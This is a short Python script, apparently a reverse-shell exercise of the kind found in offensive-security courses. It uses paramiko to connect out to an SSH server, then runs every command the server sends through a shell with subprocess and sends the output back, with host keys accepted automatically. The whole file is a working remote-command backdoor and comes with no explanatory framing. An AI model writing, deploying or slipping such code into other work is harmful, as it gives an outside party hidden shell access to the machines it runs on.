import subprocess
import paramiko
import getpass

def ssh_command(ip, port, user, passwd, command) -> None:
    client = paramiko.SSHClient()
    #client.load_host_keys("test_rsa.key.pub")
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    private_key = paramiko.RSAKey.from_private_key_file("test_rsa.key")
    client.connect(ip, port=port, username=user, password=passwd,  pkey=private_key)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024)) # read banner

        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command.decode(), shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
    client.close()
    return 

if __name__ ==  '__main__':
    user = input('Username: ')
    passwd = getpass.getpass()
    
    ip = input('Enter server IP: ') or '192.168.0.1'
    port =int(input('Enter server port: ') or 22)
    
    ssh_command(ip, port, user, passwd, 'ClientConnected')